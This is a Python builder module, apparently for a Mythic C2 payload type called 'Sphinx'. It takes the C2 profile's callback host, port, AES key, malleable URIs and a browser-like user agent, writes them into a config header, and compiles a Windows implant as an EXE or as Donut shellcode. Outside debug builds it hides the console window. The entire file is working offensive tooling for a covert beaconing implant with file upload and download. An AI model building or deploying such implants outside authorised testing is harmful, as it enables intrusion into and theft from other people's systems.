import pathlib
import json
import base64
import asyncio
import shutil
import tempfile
import logging
import traceback

from mythic_container.PayloadBuilder import (
    PayloadType,
    BuildParameter,
    BuildStep,
    BuildParameterType,
    BuildStatus,
    BuildResponse,
    AgentType,
    SupportedOS,
)
from mythic_container.MythicRPC import (
    SendMythicRPCPayloadUpdatebuildStep,
    MythicRPCPayloadUpdateBuildStepMessage,
    SendMythicRPCFileGetContent,
    MythicRPCFileGetContentMessage,
    SendMythicRPCCallbackAddCommand,
    MythicRPCCallbackAddCommandMessage,
)
from mythic_container.MythicCommandBase import (
    PTOnNewCallbackAllData,
    PTOnNewCallbackResponse,
)

log = logging.getLogger(__name__)

# Core built-in commands: always present in the agent without going through `load`,
# so they must be marked as "loaded" for the Mythic UI to recognise them.
CORE_COMMANDS = ["sleep", "exit", "load", "unload", "list", "download", "upload"]


class Sphinx(PayloadType):
    name = "sphinx"
    file_extension = "exe"
    author = "@blazar"
    agent_type = AgentType.Agent
    supported_os = [SupportedOS.Windows]
    mythic_encrypts = True
    supports_dynamic_loading = True
    translation_container = "SphinxTranslator"
    c2_profiles = ["httpx"]

    note = """
    Sphinx - Windows x64 implant written in C.
    Uses httpx for malleable HTTP C2.
    Output is .exe or shellcode (.bin) via Donut.
    """

    agent_path = pathlib.Path(".") / "sphinx" / "mythic"
    agent_code_path = pathlib.Path(".") / "sphinx" / "agent_code"
    agent_icon_path = agent_path / "agent_functions" / "sphinx.svg"

    build_parameters = [
        BuildParameter(
            name="output_type",
            parameter_type=BuildParameterType.ChooseOne,
            choices=["EXE", "Shellcode"],
            default_value="EXE",
            description="Output format: Shellcode (.bin) or executable (.exe)",
        ),
        BuildParameter(
            name="debug",
            parameter_type=BuildParameterType.Boolean,
            default_value=True,
            description="Debug build: console window visible (for testing). Without debug: -mwindows (hidden window).",
        ),
    ]

    build_steps = [
        BuildStep(step_name="Stamping Config", step_description="Writing build parameters into config.h"),
        BuildStep(step_name="Compiling", step_description="Cross-compiling C code with mingw-w64"),
    ]

    async def build(self) -> BuildResponse:
        resp = BuildResponse(status=BuildStatus.Success)

        try:
            if not self.c2info:
                raise Exception("No C2 profile selected")

            params = self.c2info[0].get_parameters_dict()

            # ── AES key ──
            aes = params.get("AESPSK")
            enc_key_b64 = None
            if isinstance(aes, dict):
                enc_key_b64 = aes.get("enc_key")
            if not enc_key_b64:
                raise Exception("AESPSK missing enc_key: the C2 profile must use aes256_hmac")

            key_bytes = base64.b64decode(enc_key_b64)
            if len(key_bytes) != 32:
                raise Exception(f"AES key must be 32 bytes, got {len(key_bytes)}")
            enc_key_array = ", ".join(f"0x{b:02X}" for b in key_bytes)

            # ── Callback domain ──
            domains = params.get("callback_domains")
            if isinstance(domains, str):
                try:
                    domains = json.loads(domains)
                except json.JSONDecodeError:
                    domains = None
            if not domains or not isinstance(domains, list):
                raise Exception("callback_domains is empty or invalid")

            url = domains[0]
            use_tls = 1 if url.startswith("https://") else 0
            url_no_scheme = url.split("://", 1)[-1]
            if ":" in url_no_scheme:
                host, port_s = url_no_scheme.rsplit(":", 1)
                port = int(port_s)
            else:
                host = url_no_scheme
                port = 443 if use_tls else 80

            # ── raw_c2_config (malleable) ──
            get_uri = "/"
            post_uri = "/"
            user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"

            raw_file_id = params.get("raw_c2_config")
            if raw_file_id:
                content_resp = await SendMythicRPCFileGetContent(
                    MythicRPCFileGetContentMessage(AgentFileId=raw_file_id)
                )
                if not content_resp.Success:
                    raise Exception(f"Failed to read raw_c2_config: {content_resp.Error}")
                cfg = json.loads(content_resp.Content.decode())

                get_cfg = cfg.get("get", {})
                post_cfg = cfg.get("post", {})
                get_uri = get_cfg.get("uris", ["/"])[0]
                post_uri = post_cfg.get("uris", ["/"])[0]

                msg = get_cfg.get("client", {}).get("message", {})
                loc = msg.get("location", "body")
                if loc not in ("body", "query", "cookie", "header"):
                    raise Exception(f"Invalid GET message location: '{loc}'")

                ua = get_cfg.get("client", {}).get("headers", {}).get("User-Agent")
                if ua:
                    user_agent = ua

            sleep_time = int(params.get("callback_interval") or 10)
            jitter = int(params.get("callback_jitter") or 0)

            # ── Copy agent_code a temp ──
            agent_build_path = tempfile.TemporaryDirectory(suffix=self.uuid)
            shutil.copytree(str(self.agent_code_path), agent_build_path.name, dirs_exist_ok=True)

            # ── Stamping config.h ──
            debug = bool(self.get_parameter("debug"))
            config_content = (
                "// Generated by builder.py — do not edit manually.\n"
                "#ifndef SPHINX_CONFIG_H\n#define SPHINX_CONFIG_H\n\n"
                f'#define CALLBACK_HOST  L"{host}"\n'
                f"#define CALLBACK_PORT  {port}\n"
                f'#define CALLBACK_PATH  L"{get_uri}"\n'
                f'#define POST_PATH      L"{post_uri}"\n'
                f'#define USER_AGENT     L"{user_agent}"\n'
                f"#define SLEEP_TIME     {sleep_time}\n"
                f"#define JITTER         {jitter}\n"
                f"#define DEBUG          {1 if debug else 0}\n"
                f"#define USE_TLS        {use_tls}\n"
                f'#define PAYLOAD_UUID   "{self.uuid}"\n'
                f"#define ENC_KEY {{{enc_key_array}}}\n\n"
                "#endif //SPHINX_CONFIG_H\n"
            )
            config_path = pathlib.Path(agent_build_path.name) / "Include" / "config.h"
            with open(config_path, "w") as f:
                f.write(config_content)

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Stamping Config",
                StepStdout=f"host={host}:{port} tls={use_tls} get={get_uri} post={post_uri}",
                StepSuccess=True,
            ))

            # ── Compile ──
            make_cmd = "make clean && make" + (" DEBUG=1" if debug else "")
            proc = await asyncio.create_subprocess_shell(
                make_cmd,
                stdout=asyncio.subprocess.PIPE,
                stderr=asyncio.subprocess.PIPE,
                cwd=agent_build_path.name,
            )
            stdout, stderr = await proc.communicate()

            if proc.returncode != 0:
                await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                    PayloadUUID=self.uuid,
                    StepName="Compiling",
                    StepStdout=stdout.decode(errors="replace"),
                    StepSuccess=False,
                ))
                resp.set_status(BuildStatus.Error)
                resp.build_stderr = f"[make stderr]\n{stderr.decode(errors='replace')}\n[make stdout]\n{stdout.decode(errors='replace')}"
                return resp

            exe_path = pathlib.Path(agent_build_path.name) / "sphinx.exe"
            if not exe_path.exists():
                raise Exception(f"sphinx.exe was not produced. stdout={stdout.decode(errors='replace')}")

            resp.payload = exe_path.read_bytes()
            resp.build_stdout = stdout.decode(errors="replace")
            resp.updated_filename = f"sphinx_httpx{'_debug' if debug else ''}.exe"

            await SendMythicRPCPayloadUpdatebuildStep(MythicRPCPayloadUpdateBuildStepMessage(
                PayloadUUID=self.uuid,
                StepName="Compiling",
                StepStdout=f"Compiled {len(resp.payload)} bytes",
                StepSuccess=True,
            ))
            resp.build_message = "Sphinx built OK"
            return resp

        except Exception as e:
            resp.set_status(BuildStatus.Error)
            resp.build_stderr = f"Error building payload: {e}\n{traceback.format_exc()}"
            return resp

    async def on_new_callback(self, newCallback: PTOnNewCallbackAllData) -> PTOnNewCallbackResponse:
        # Mark core built-in commands as loaded on the new callback
        # so File Browser and Process Browser recognise them.
        await SendMythicRPCCallbackAddCommand(MythicRPCCallbackAddCommandMessage(
            AgentCallbackID=newCallback.Callback.AgentCallbackID,
            Commands=CORE_COMMANDS,
        ))
        return PTOnNewCallbackResponse(AgentCallbackID=newCallback.Callback.AgentCallbackID, Success=True)
